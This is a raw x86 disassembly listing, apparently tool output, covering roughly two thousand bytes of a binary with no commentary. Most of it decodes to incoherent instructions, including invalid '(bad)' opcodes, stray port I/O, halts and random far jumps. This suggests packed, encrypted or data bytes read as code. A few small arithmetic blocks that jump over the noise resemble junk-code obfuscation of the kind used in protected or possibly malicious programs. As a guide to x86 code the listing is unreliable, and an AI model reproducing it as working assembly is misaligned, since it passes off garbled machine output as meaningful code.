  41356e:	push   0xffffffea
  413570:	xchg   BYTE PTR ds:0xbea2a069,dh
  413576:	or     al,0x11
  413578:	pop    ecx
  413579:	xor    bh,BYTE PTR [eax]
  41357b:	daa    
  41357c:	mov    ah,0xb4
  41357e:	aad    0xda
  413580:	mov    al,0x3
  413582:	pop    ss
  413583:	jmp    0x413558
  413585:	cmp    eax,DWORD PTR [edi-0x5ac79559]
  41358b:	es retf 
  41358d:	lock jnp 0x41354a
  413590:	and    dl,BYTE PTR [ebp+edi*1-0x76afd48b]
  413597:	bound  ebp,QWORD PTR [esi-0x49]
  41359a:	in     al,0xda
  41359c:	mov    bh,0xef
  41359e:	sbb    DWORD PTR [ecx],esp
  4135a0:	ds cmp esp,eax
  4135a3:	mov    ebp,DWORD PTR [edx]
  4135a5:	aaa    
  4135a6:	daa    
  4135a7:	and    al,0x7a
  4135a9:	mov    ds:0x78f69a57,al
  4135ae:	xchg   BYTE PTR [ecx],bl
  4135b0:	and    edi,esp
  4135b2:	scas   eax,DWORD PTR es:[edi]
  4135b3:	fnstsw WORD PTR es:[ebp*1-0x57d2ec75]
  4135bb:	es sbb eax,0xab36c6cf
  4135c1:	ret    0xcea8
  4135c4:	leave  
  4135c5:	fimul  DWORD PTR [edx+esi*8-0x2993836a]
  4135cc:	fistp  WORD PTR ds:0x65f02ecf
  4135d2:	lods   eax,DWORD PTR ds:[esi]
  4135d3:	push   ebp
  4135d4:	sub    dh,BYTE PTR [eax]
  4135d6:	imul   edi
  4135d8:	test   BYTE PTR [edx+edx*4+0x32ea3bcc],cl
  4135df:	sbb    BYTE PTR [eax+0x51],ch
  4135e2:	adc    BYTE PTR [edx],dh
  4135e4:	sub    eax,0x2453cf04
  4135e9:	imul   ecx,DWORD PTR [eax+ebx*8+0x7bef8a6d],0x80cabbb7
  4135f4:	sub    al,0x2b
  4135f6:	mov    ds:0x2965c36e,eax
  4135fb:	dec    ebx
  4135fc:	sbb    eax,0x810034fe
  413601:	or     cl,dl
  413603:	call   0x3db9cee7
  413608:	fbstp  TBYTE PTR [eax+ebp*8-0x1d]
  41360c:	push   esp
  41360d:	aad    0x8e
  41360f:	mov    bh,0x2b
  413611:	sub    ebp,eax
  413613:	mov    esp,ebx
  413615:	and    eax,0xdac4aa1a
  41361a:	and    eax,0xe8fdfc28
  41361f:	fistp  DWORD PTR [esp+ebp*8]
  413622:	pop    ebx
  413623:	dec    eax
  413624:	out    dx,eax
  413625:	(bad)  
  413626:	sar    DWORD PTR [edi],cl
  413628:	stc    
  413629:	and    al,BYTE PTR [esi+0x23305bf7]
  41362f:	outs   dx,BYTE PTR ds:[esi]
  413630:	mov    bl,0xee
  413632:	pop    es
  413633:	pushf  
  413634:	adc    bh,BYTE PTR [ecx]
  413636:	clc    
  413637:	jns    0x4136a9
  413639:	in     al,dx
  41363a:	jecxz  0x413608
  41363c:	or     BYTE PTR [esi+0xf],0xe5
  413640:	(bad)  
  413641:	xor    bl,BYTE PTR ds:0x314ed1cb
  413647:	sar    DWORD PTR [edi-0x73],0x72
  41364b:	xchg   esp,eax
  41364c:	cmp    BYTE PTR [ecx-0x72e37805],bh
  413652:	mov    cl,0x9e
  413654:	mov    ds:0x1f4cd05b,eax
  413659:	je     0x9f8a17df
  41365f:	ror    DWORD PTR [ebx],0xfd
  413662:	pushf  
  413663:	cwde   
  413664:	mov    ecx,0x2a2dc684
  413669:	pop    eax
  41366a:	ins    BYTE PTR es:[edi],dx
  41366b:	shl    BYTE PTR [ebp+0x52],cl
  41366e:	cmp    bl,BYTE PTR [edi+0x61]
  413671:	stos   DWORD PTR es:[edi],eax
  413672:	mov    bl,0x56
  413674:	lahf   
  413675:	jnp    0x4136ec
  413677:	test   eax,0x2eb39a37
  41367c:	add    ebx,ecx
  41367e:	fs mov ch,0xd9
  413681:	aaa    
  413682:	pop    esi
  413683:	push   0xffffffdf
  413685:	cwde   
  413686:	scas   eax,DWORD PTR es:[edi]
  413687:	jo     0x4136b9
  413689:	mov    bh,0x68
  41368b:	out    dx,eax
  41368c:	pushf  
  41368d:	push   ecx
  41368e:	xchg   esp,eax
  41368f:	hlt    
  413690:	and    DWORD PTR [eax-0x57],ecx
  413693:	int3   
  413694:	std    
  413695:	test   DWORD PTR [edi+0x75819d0c],0xa1062b96
  41369f:	lods   eax,DWORD PTR ds:[esi]
  4136a0:	jnp    0x41371a
  4136a2:	jae    0x413671
  4136a4:	jmp    0x413687
  4136a6:	sbb    al,0xc8
  4136a8:	ds ffreep st(4)
  4136ab:	push   ss
  4136ac:	inc    eax
  4136ad:	push   eax
  4136ae:	hlt    
  4136af:	aam    0x24
  4136b1:	scas   al,BYTE PTR es:[edi]
  4136b2:	dec    ebx
  4136b3:	cmp    eax,0x5058aa6f
  4136b8:	scas   al,BYTE PTR es:[edi]
  4136b9:	xchg   DWORD PTR [ecx-0x2b],esi
  4136bc:	sub    al,BYTE PTR ds:0xe223f92d
  4136c2:	or     edi,DWORD PTR [esi+0x2db9e538]
  4136c8:	xchg   ebx,eax
  4136c9:	pop    ebp
  4136ca:	push   0x23e369d0
  4136cf:	cmp    al,0xfc
  4136d1:	shl    edi,1
  4136d3:	mov    edx,DWORD PTR [ebp-0x44]
  4136d6:	mov    edi,DWORD PTR [ebp-0xc]
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x37488de7]
  4136f4:	test   ah,al
  4136f6:	sub    BYTE PTR [ebp+0x7f],bh
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x4136a1
  4136ff:	add    al,0x22
  413701:	pop    edx
  413702:	xor    ch,cl
  413704:	dec    eax
  413705:	test   al,0xed
  413707:	pop    edi
  413708:	xor    eax,0xf9167b37
  41370d:	loope  0x41370d
  41370f:	jge    0x413698
  413711:	lods   eax,DWORD PTR ds:[esi]
  413712:	cs inc edi
  413714:	stos   DWORD PTR es:[edi],eax
  413715:	sbb    eax,0xd454344d
  41371a:	mov    eax,0x6b58d814
  41371f:	test   esi,edi
  413721:	pop    eax
  413722:	push   ebx
  413723:	xchg   DWORD PTR [eax+0x3d],eax
  413726:	push   ecx
  413727:	das    
  413728:	fcom   QWORD PTR [ecx+ecx*4]
  41372b:	mov    al,ds:0xa09ec5e5
  413730:	fucomip st,st(7)
  413732:	xor    ebx,DWORD PTR [eax+edi*2]
  413735:	sub    eax,0xedbfb978
  41373a:	mov    ecx,0x2d6b2119
  41373f:	push   ebp
  413740:	mov    edx,DWORD PTR [eax+0x55daa763]
  413746:	pusha  
  413747:	(bad)  
  413748:	mov    cl,0x80
  41374a:	dec    ebp
  41374b:	rcl    DWORD PTR [eax+0x44],1
  41374e:	or     BYTE PTR ds:0x4d8f922d,0xa8
  413755:	and    edi,DWORD PTR [ebx]
  413757:	inc    ebx
  413758:	fst    DWORD PTR ds:0x12200dd3
  41375e:	dec    esi
  41375f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413760:	jbe    0x4137cf
  413762:	ds es push esp
  413765:	pop    ds
  413766:	adc    dl,BYTE PTR ds:0x4f55e32d
  41376c:	push   0x60
  41376e:	cmp    dl,BYTE PTR [edx+0x63]
  413771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413772:	push   eax
  413773:	pusha  
  413774:	mov    ah,0xb3
  413776:	sub    al,0xbf
  413778:	mov    ch,0x44
  41377a:	stos   DWORD PTR es:[edi],eax
  41377b:	into   
  41377c:	pop    eax
  41377d:	dec    edi
  41377e:	add    al,0xe1
  413780:	call   0x773f:0x23da2d6a
  413787:	jmp    0x5887:0x7f3b718d
  41378e:	(bad)  
  41378f:	or     al,0x67
  413791:	pop    ebx
  413792:	jmp    0xd92f:0x53d1dca5
  413799:	mov    ebx,DWORD PTR [ecx]
  41379b:	xor    DWORD PTR [edi-0x2c],esp
  41379e:	cmp    ebp,ecx
  4137a0:	fcom   QWORD PTR [ebp+0x3c]
  4137a3:	in     eax,dx
  4137a4:	fcomp  QWORD PTR [edx-0xf769d70]
  4137aa:	push   cs
  4137ab:	mov    ebp,0x3fb8c828
  4137b0:	adc    al,0xf0
  4137b2:	cdq    
  4137b3:	lahf   
  4137b4:	mov    edx,0x443c1e5
  4137b9:	imul   edi,DWORD PTR [ebx],0x7c688b8a
  4137bf:	push   es
  4137c0:	(bad)  
  4137c1:	and    ebx,ecx
  4137c3:	mov    al,ds:0x6a650eae
  4137c8:	lods   al,BYTE PTR ds:[esi]
  4137c9:	popf   
  4137ca:	mov    bh,0x82
  4137cc:	(bad)  
  4137cd:	xor    ebx,edi
  4137cf:	rol    BYTE PTR [ebx-0x21],cl
  4137d2:	test   ebp,ecx
  4137d4:	xchg   ebp,eax
  4137d5:	lods   eax,DWORD PTR ds:[esi]
  4137d6:	xor    al,0x66
  4137d8:	dec    eax
  4137d9:	mov    al,0xa9
  4137db:	xor    BYTE PTR [edi-0x27],dh
  4137de:	mov    bl,0x5c
  4137e0:	sbb    ebp,ebp
  4137e2:	fld    QWORD PTR [ebx]
  4137e4:	sub    al,0x8
  4137e6:	and    ecx,esi
  4137e8:	push   cs
  4137e9:	test   BYTE PTR [eax],0xfc
  4137ec:	and    al,0xc4
  4137ee:	pop    ebx
  4137ef:	rcl    bl,cl
  4137f1:	das    
  4137f2:	mov    ds:0xed2d4d83,eax
  4137f7:	into   
  4137f8:	popf   
  4137f9:	(bad)  
  4137fa:	lahf   
  4137fb:	loope  0x413835
  4137fd:	fdivr  st,st(7)
  4137ff:	mov    ebp,0xefe9daff
  413804:	add    DWORD PTR [edx+0x50],0x2884d916
  41380b:	adc    dh,dl
  41380d:	push   ds
  41380e:	inc    esi
  41380f:	cld    
  413810:	inc    DWORD PTR [ecx+0x5d933f5b]
  413816:	call   0xb45e:0x249d6502
  41381d:	popf   
  41381e:	mov    ah,0xa1
  413820:	popa   
  413821:	aad    0xac
  413823:	jbe    0x41389a
  413825:	sub    eax,0x4992a4a9
  41382a:	xchg   ebx,eax
  41382b:	inc    esp
  41382c:	sub    al,0x83
  41382e:	inc    esi
  41382f:	dec    esp
  413830:	je     0x4137f0
  413832:	out    dx,eax
  413833:	sbb    ebx,ebx
  413835:	loope  0x41383e
  413837:	(bad)  
  413839:	std    
  41383a:	adc    BYTE PTR [edi+0xaf97189],dh
  413840:	mov    dh,0x8
  413842:	pop    ss
  413843:	std    
  413844:	out    0x4f,al
  413846:	lahf   
  413847:	call   0x8fae:0xb3a3f39a
  41384e:	loope  0x41385d
  413850:	mov    dl,0x3a
  413852:	mov    ds:0xe57cbd3d,eax
  413857:	pop    ebx
  413858:	mov    eax,0x8811172f
  41385d:	ss loope 0x4137e7
  413860:	dec    ebp
  413861:	leave  
  413862:	jnp    0x4138de
  413864:	or     al,0xfa
  413866:	fadd   DWORD PTR [ebx]
  413868:	xlat   BYTE PTR ds:[ebx]
  413869:	mov    esi,0x56932cf4
  41386e:	pusha  
  41386f:	in     eax,dx
  413870:	call   0xc9e11d1b
  413875:	popf   
  413876:	mov    ds:0xfe30fd44,al
  41387b:	bound  ebp,QWORD PTR [edi+0x5a]
  41387e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41387f:	mov    al,ds:0xede85cce
  413884:	xor    eax,0xedcbd57a
  413889:	mov    eax,0xb133e8f9
  41388e:	pop    ebp
  41388f:	push   esi
  413890:	or     edi,DWORD PTR [edx-0x1c278afe]
  413896:	jne    0x4138ad
  413898:	retf   
  413899:	out    0x97,eax
  41389b:	div    ah
  41389d:	addr16 or eax,0x44fb5102
  4138a3:	jnp    0x4138d4
  4138a5:	xchg   ebp,eax
  4138a6:	aas    
  4138a7:	cmp    bl,BYTE PTR [eax-0x307a607d]
  4138ad:	sbb    BYTE PTR [edi+0x79],bl
  4138b0:	jge    0x413906
  4138b2:	jmp    0xcb77:0x21f9e7e3
  4138b9:	out    dx,eax
  4138ba:	dec    ecx
  4138bb:	jno    0x413911
  4138bd:	dec    edi
  4138be:	and    eax,0x189d8ace
  4138c3:	pop    edi
  4138c4:	jle    0x41384b
  4138c6:	mov    ds:0xc8a574e7,al
  4138cb:	dec    edx
  4138cc:	sub    edx,esp
  4138ce:	xor    eax,0x4ae55196
  4138d3:	sar    BYTE PTR [eax],1
  4138d5:	xor    eax,0x6f284a65
  4138da:	test   DWORD PTR [ecx],esi
  4138dc:	je     0x4138b8
  4138de:	mov    dh,0x7a
  4138e0:	popf   
  4138e1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4138e3:	(bad)  
  4138e4:	mov    ds:0xc659b70b,eax
  4138e9:	jae    0x413887
  4138eb:	js     0x7daed86b
  4138f1:	push   ss
  4138f2:	mov    BYTE PTR ds:0xc1bf69d8,dl
  4138f8:	stos   BYTE PTR es:[edi],al
  4138f9:	or     ch,BYTE PTR [ecx+0x90515b2]
  4138ff:	xchg   DWORD PTR [edi+edx*1-0xcb243c1],eax
  413906:	lea    ebp,[edx+eax*2+0x4d]
  41390a:	mov    ds:0x50298e65,eax
  41390f:	mov    ebp,0x6aad1737
  413914:	push   eax
  413915:	(bad)  
  413916:	gs jnp 0x4138f1
  413919:	sbb    eax,0x90f2f828
  41391e:	push   ss
  41391f:	and    BYTE PTR [ecx+0x60],ah
  413922:	inc    DWORD PTR [edx+0x7ceaafec]
  413928:	pop    edx
  413929:	jnp    0x413945
  41392b:	mov    edi,0xf27e1448
  413930:	das    
  413931:	(bad)  
  413932:	stos   DWORD PTR es:[edi],eax
  413933:	xchg   esp,eax
  413934:	ret    0x887c
  413937:	test   DWORD PTR [edx],eax
  413939:	in     eax,0x3d
  41393b:	mov    WORD PTR [ebx],?
  41393d:	mov    esi,0x1f92f5bd
  413942:	ss mov esp,0x6d9fc559
  413948:	sahf   
  413949:	test   al,0xfa
  41394b:	les    ecx,FWORD PTR [ebp+edx*1+0x41]
  41394f:	outs   dx,DWORD PTR ds:[esi]
  413951:	inc    eax
  413952:	test   eax,0xb34fcc68
  413957:	scas   eax,DWORD PTR es:[edi]
  413958:	jle    0x413943
  41395a:	adc    al,0xbf
  41395c:	pop    edi
  41395d:	rol    ebp,cl
  41395f:	jno    0x4139a3
  413961:	xchg   edx,eax
  413962:	repnz hlt 
  413964:	loop   0x4139a8
  413966:	bound  ebp,QWORD PTR [esi]
  413968:	mov    ds:0x3d7af0f,al
  41396d:	push   ebp
  41396e:	in     al,dx
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x41396f
  413996:	jmp    0x3d6c9ca
  41399b:	jg     0x413a15
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	ins    DWORD PTR es:[edi],dx
  4139a2:	arpl   WORD PTR [edi+0x24],bp
  4139a5:	cmp    eax,0xefc90045
  4139aa:	stc    
  4139ab:	push   ss
  4139ac:	sbb    BYTE PTR [edx+ebp*8],al
  4139af:	fwait
  4139b0:	mov    bh,0x6e
  4139b2:	ror    DWORD PTR [esi],cl
  4139b4:	es pop es
  4139b6:	imul   edx,eax,0xffffff9f
  4139b9:	xor    al,0xaa
  4139bb:	pop    eax
  4139bc:	mov    ?,edi
  4139be:	lock call 0xfa41:0xbd946308
  4139c6:	push   edi
  4139c7:	mov    ?,WORD PTR [ebx]
  4139c9:	push   edi
  4139ca:	sub    ah,BYTE PTR [edi+0xf]
  4139cd:	sub    DWORD PTR [esi],esi
  4139cf:	stc    
  4139d0:	adc    BYTE PTR [ebx+0x69],0x59
  4139d4:	test   BYTE PTR [edi],dh
  4139d6:	jecxz  0x413a1e
  4139d8:	or     al,0x1
  4139da:	cmp    dh,ah
  4139dc:	lods   al,BYTE PTR ds:[esi]
  4139dd:	mov    bh,0x89
  4139df:	ins    DWORD PTR es:[edi],dx
  4139e0:	mov    ch,0xa5
  4139e2:	mov    dh,BYTE PTR [ebx]
  4139e4:	cdq    
  4139e5:	div    DWORD PTR [ecx-0x2795d06b]
  4139eb:	aaa    
  4139ec:	push   edx
  4139ed:	cwde   
  4139ee:	cmp    eax,DWORD PTR [ecx+0x746ab23b]
  4139f4:	or     eax,0xcec3d5ec
  4139f9:	and    bh,dl
  4139fb:	call   FWORD PTR [edx]
  4139fd:	cmp    esi,DWORD PTR [ebp+ebx*1+0x5c006e46]
  413a04:	lods   al,BYTE PTR ds:[esi]
  413a05:	pop    edx
  413a06:	test   al,0xa3
  413a08:	push   edi
  413a09:	dec    ecx
  413a0a:	aam    0x3c
  413a0c:	inc    edi
  413a0d:	mov    ?,edi
  413a0f:	mov    bl,0x6e
  413a11:	push   0x76
  413a13:	sbb    eax,0x38e9a485
  413a18:	sbb    edx,DWORD PTR [ebp+0x7e7b80ca]
  413a1e:	pop    es
  413a1f:	dec    esp
  413a20:	xor    BYTE PTR [esi],bh
  413a22:	sub    bl,ah
  413a24:	mov    edx,0xade2af3b
  413a29:	dec    esi
  413a2a:	test   BYTE PTR [ecx+0x4131d6e6],cl
  413a30:	fcomip st,st(5)
  413a32:	rcr    ecx,cl
  413a34:	addr16 mov dh,0x14
  413a37:	or     eax,0x8f758f3c
  413a3c:	mov    edi,0x405e88d
  413a41:	aas    
  413a42:	loop   0x413a0f
  413a44:	jp     0x413a9f
  413a46:	cmp    edi,0x7
  413a49:	inc    eax
  413a4a:	xor    DWORD PTR [esp+esi*4-0x236a9931],eax
  413a51:	or     eax,0xcf963d59
  413a56:	popf   
  413a57:	leave  
  413a58:	aaa    
  413a59:	or     al,0x46
  413a5b:	jle    0x413a1e
  413a5d:	or     eax,0x1328fbd7
  413a62:	fdiv   DWORD PTR [eax+edx*1]
  413a65:	in     eax,dx
  413a66:	push   eax
  413a67:	mov    ecx,?
  413a69:	dec    edi
  413a6a:	repz dec ebx
  413a6c:	jbe    0x413a13
  413a6e:	push   ebp
  413a6f:	xor    DWORD PTR [edx+0x197c21b9],eax
  413a75:	neg    DWORD PTR [ebx-0x4a]
  413a78:	repnz jmp 0x7e68:0xef68b4bf
  413a80:	dec    ecx
  413a81:	cmp    BYTE PTR [ebp+0xf],cl
  413a84:	sar    BYTE PTR [ebx+0x1772e9b4],cl
  413a8a:	jns    0x413a88
  413a8c:	shl    DWORD PTR [ebx-0x11604d36],cl
  413a92:	xor    al,BYTE PTR [eax+0x1]
  413a95:	scas   eax,DWORD PTR es:[edi]
  413a96:	outs   dx,DWORD PTR ds:[esi]
  413a97:	fcmovne st,st(2)
  413a99:	pusha  
  413a9a:	or     DWORD PTR [eax-0x4f],0x55
  413a9e:	dec    ebp
  413a9f:	sbb    DWORD PTR [esi+0x1cc7243c],0xa705b081
  413aa9:	adc    ebx,DWORD PTR [edi+0x4e]
  413aac:	cmp    ah,0x9f
  413aaf:	xlat   BYTE PTR ds:[ebx]
  413ab0:	pop    edi
  413ab1:	mov    al,0x9
  413ab3:	in     eax,dx
  413ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ab5:	mov    dl,0x17
  413ab7:	bts    DWORD PTR [ebp+0x47b73ca5],esp
  413abe:	adc    DWORD PTR [ecx-0x6b85a15f],0xd8313506
  413ac8:	pop    edi
  413ac9:	fcmovne st,st(1)
  413acb:	cmc    
  413acc:	inc    eax
  413acd:	pop    edx
  413ace:	jae    0x413aef
  413ad0:	sbb    eax,0x1bbde0d7
  413ad5:	jg     0x413a71
  413ad7:	inc    ecx
  413ad8:	ror    BYTE PTR [edx+0x29c708dc],0xa3
  413adf:	pop    eax
  413ae0:	test   BYTE PTR [ecx],bl
  413ae2:	(bad)  
  413ae3:	sbb    esp,DWORD PTR [edx+0x13]
  413ae6:	mov    edx,0x7322cc96
  413aeb:	mov    eax,ds:0x4b3f4b89
  413af0:	aas    
  413af1:	mov    edi,eax
  413af3:	cmp    bl,al
  413af5:	inc    edx
  413af6:	mov    al,BYTE PTR [ecx-0x6d718176]
  413afc:	pop    ebp
  413afd:	cli    
  413afe:	stos   BYTE PTR es:[edi],al
  413aff:	adc    al,0x39
  413b01:	aad    0x1a
  413b03:	mov    WORD PTR [ebx+0x22f9df82],?
  413b09:	test   BYTE PTR [ebx-0x37ee53be],bh
  413b0f:	ins    DWORD PTR es:[edi],dx
  413b10:	jnp    0x413b1b
  413b12:	jle    0x413adc
  413b14:	and    ecx,esi
  413b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b17:	push   0x77
  413b19:	and    ch,bh
  413b1b:	push   ebp
  413b1c:	jns    0x413b4f
  413b1e:	adc    al,0x4c
  413b20:	cmp    DWORD PTR [esi+eax*4],esp
  413b23:	inc    esi
  413b24:	and    esp,DWORD PTR [ecx]
  413b26:	stos   DWORD PTR es:[edi],eax
  413b27:	ret    0xcd8c
  413b2a:	(bad)  
  413b2b:	cmp    dh,ch
  413b2d:	sub    ch,bl
  413b2f:	arpl   WORD PTR [ebx],sp
  413b31:	ret    0xe294
  413b34:	pushf  
  413b35:	shl    DWORD PTR [ebx+edi*2-0x62646b51],0xff
  413b3d:	fistp  WORD PTR [ebx-0x3c]
  413b40:	shl    DWORD PTR [edx-0x5d],cl
  413b43:	xor    DWORD PTR [edx],ebp
  413b45:	div    BYTE PTR [ebx-0x45]
  413b48:	jns    0x413b21
  413b4a:	sub    bl,dl
  413b4c:	mov    esi,0x8f7b0f66
  413b51:	das    
  413b52:	dec    edi
  413b53:	xchg   DWORD PTR [esi-0x9059f81],edi
  413b59:	jbe    0x413b0c
  413b5b:	mov    edi,0x8bfdafe3
  413b60:	mov    ds:0xe714ab61,al
  413b65:	out    0x8c,al
  413b67:	sub    al,0x45
  413b69:	pushf  
  413b6a:	iret   
  413b6b:	sahf   
  413b6c:	push   ss
  413b6d:	(bad)
  413b71:	jg     0x413be3
  413b73:	sbb    edi,esp
  413b75:	fwait
  413b76:	add    ah,BYTE PTR [edi]
  413b78:	xor    eax,0x286fcf1f
  413b7d:	sti    
  413b7e:	shr    al,1
  413b80:	jp     0x413b9d
  413b82:	dec    edi
  413b83:	inc    eax
  413b84:	push   0x66
  413b86:	and    esp,edi
  413b88:	leave  
  413b89:	and    eax,0x6b93f03f
  413b8e:	gs ins DWORD PTR es:[edi],dx
  413b90:	imul   edi,DWORD PTR [esi-0x78b133f1],0xffffffb3
  413b97:	sti    
  413b98:	xchg   esp,eax
  413b99:	push   0xffffffd6
  413b9b:	or     BYTE PTR [edx-0x41e85776],0x45
  413ba2:	cmp    BYTE PTR ds:0x24adaa46,ch
  413ba8:	shl    DWORD PTR [esi+0x7e],1
  413bab:	int    0x68
  413bad:	jmp    0x6da193a7
  413bb2:	in     eax,dx
  413bb3:	call   0xa169:0x5afafc22
  413bba:	pop    esi
  413bbb:	fwait
  413bbc:	mov    ch,0x25
  413bbe:	cli    
  413bbf:	jecxz  0x413bf9
  413bc1:	lock int 0xa3
  413bc4:	mov    ds:0xb1bcd352,al
  413bc9:	pop    esi
  413bca:	xor    ebx,DWORD PTR [eax-0x7401e5b4]
  413bd0:	aaa    
  413bd1:	add    BYTE PTR [eax+0x35873676],bh
  413bd7:	pop    ebp
  413bd8:	adc    al,0xd1
  413bda:	and    DWORD PTR [edi-0x52efd17],ebx
  413be0:	pop    ss
  413be1:	sub    eax,0xe443cf7
  413be6:	in     eax,dx
  413be7:	dec    ebp
  413be8:	int3   
  413be9:	jle    0x413c62
  413beb:	push   esp
  413bec:	inc    esi
  413bed:	dec    edi
  413bee:	popa   
  413bef:	jmp    0xd449:0xb80636a0
  413bf6:	mov    bl,0xba
  413bf8:	xchg   ecx,eax
  413bf9:	xor    esi,eax
  413bfb:	scas   al,BYTE PTR es:[edi]
  413bfc:	cmp    BYTE PTR [edi],0x1b
  413bff:	(bad)  
  413c00:	push   esp
  413c01:	xor    al,0x56
  413c03:	(bad)  
  413c04:	pop    ebp
  413c05:	xchg   ebx,eax
  413c06:	xor    al,0xa5
  413c08:	retf   
  413c09:	int3   
  413c0a:	and    BYTE PTR [ebx+ebp*1],dh
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	outs   dx,DWORD PTR ds:[esi]
  413c2a:	sub    BYTE PTR [ebx-0x67],ah
  413c2d:	add    al,BYTE PTR [eax]
  413c2f:	jg     0x413ca9
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	gs inc ebx
  413c37:	es mov esi,0xbdc1b6ec
  413c3d:	jmp    0x413bdc
  413c3f:	push   cs
  413c40:	repz adc eax,0x70025e7b
  413c46:	mov    esp,0xf96acc53
  413c4b:	ss aad 0xd1
  413c4e:	cmp    dh,BYTE PTR [esi+ecx*8-0x76323b7e]
  413c55:	test   al,0x24
  413c57:	sbb    BYTE PTR fs:[edx],ch
  413c5a:	fcom   DWORD PTR [ebp+0x3ea50925]
  413c60:	sbb    edx,ecx
  413c62:	dec    esi
  413c63:	pop    ecx
  413c64:	or     ebx,ecx
  413c66:	test   al,0x29
  413c68:	call   0x3a76a2c3
  413c6d:	in     al,dx
  413c6e:	ja     0x413c7b
  413c70:	jae    0x413c13
  413c72:	cmp    ch,BYTE PTR [esi-0x3e6d0b7]
  413c78:	stc    
  413c79:	pop    ss
  413c7a:	pusha  
  413c7b:	xchg   ebx,eax
  413c7c:	push   esp
  413c7d:	cmp    ecx,DWORD PTR [ebx-0x1d]
  413c80:	xchg   BYTE PTR [eax+edx*1-0x37f6026c],ah
  413c87:	neg    DWORD PTR [edx+edx*8]
  413c8a:	cli    
  413c8b:	mov    eax,0xf084bc8e
  413c90:	push   cs
  413c91:	popa   
  413c92:	loop   0x413c9d
  413c94:	mov    esi,0xd965f95
  413c99:	xchg   DWORD PTR [edi-0x4131741e],esi
  413c9f:	mov    edi,0xb4ffb673
  413ca4:	dec    ebp
  413ca5:	in     eax,dx
  413ca6:	xchg   ecx,eax
  413ca7:	sbb    DWORD PTR [ebx],esi
  413ca9:	out    0x68,eax
  413cab:	push   0x95133a1f
  413cb0:	stos   DWORD PTR es:[edi],eax
  413cb1:	and    cl,dl
  413cb3:	sbb    DWORD PTR ds:0x1f2ae7a0,edi
  413cb9:	dec    edx
  413cba:	je     0x413c72
  413cbc:	cld    
  413cbd:	dec    esi
  413cbe:	cld    
  413cbf:	jge    0x413cf6
  413cc1:	or     ebx,esi
  413cc3:	mov    eax,0x697d60e7
  413cc8:	ins    DWORD PTR es:[edi],dx
  413cc9:	jns    0x413d13
  413ccb:	sbb    DWORD PTR [edx],ebx
  413ccd:	mov    ah,0x19
  413ccf:	call   0xc7eb:0xcd51733e
  413cd6:	adc    eax,0x8b589837
  413cdb:	in     al,0x48
  413cdd:	int    0x28
  413cdf:	jmp    0x413d3d
  413ce1:	push   edx
  413ce2:	pop    esp
  413ce3:	inc    ebx
  413ce4:	add    esi,eax
  413ce6:	add    eax,0x2c406303
  413ceb:	rcl    ah,0xe0
  413cee:	gs test BYTE PTR gs:[esi],bh
  413cf2:	(bad)  
  413cf3:	std    
  413cf4:	cmc    
  413cf5:	sti    
  413cf6:	adc    esi,DWORD PTR [ebp-0x43e9e7d4]
  413cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cfd:	jmp    0x413c82
  413cff:	jmp    0x413c92
  413d01:	repz out 0x58,eax
  413d04:	xchg   edx,eax
  413d05:	lea    eax,[ebx+0x6231f425]
  413d0b:	ins    BYTE PTR es:[edi],dx
  413d0c:	mov    ebp,0x21f345f9
  413d11:	push   ss
  413d12:	repnz lahf 
  413d14:	mov    cs,ebp
  413d16:	test   ebx,ecx
  413d18:	mov    ebp,0xd567422a
  413d1d:	sbb    BYTE PTR [edx-0x14851b45],ch
  413d23:	fadd   st,st(7)
  413d25:	push   ds
  413d26:	and    DWORD PTR [edi-0x2a],edx
  413d29:	push   edi
  413d2a:	fidivr WORD PTR [edx-0x41]
  413d2d:	inc    ecx
  413d2e:	pushf  
  413d2f:	(bad)  
  413d30:	xchg   ebx,eax
  413d31:	pop    eax
  413d32:	mov    cl,0x2f
  413d34:	mov    al,0x53
  413d36:	add    DWORD PTR [edi-0x12],edx
  413d39:	bound  edx,QWORD PTR [edi+0x4d8c70cf]
  413d3f:	aad    0x68
  413d41:	pop    ebx
  413d42:	cs jg  0x413dbf
  413d45:	xchg   ecx,eax
  413d46:	xchg   DWORD PTR [edx],edi
  413d48:	rol    DWORD PTR [ebx],1
  413d4a:	rol    BYTE PTR [edi-0x78],cl
  413d4d:	fisubr DWORD PTR ds:0xc1fee30b
  413d53:	and    al,0x36
  413d55:	mov    ds,WORD PTR [ebp-0x26718c97]
  413d5b:	in     eax,0xeb
  413d5d:	add    ch,BYTE PTR [eax]
  413d5f:	vpaddusb xmm5,xmm5,XMMWORD PTR [ebx+ebx*2]
  413d64:	inc    ebx
  413d65:	loopne 0x413d65
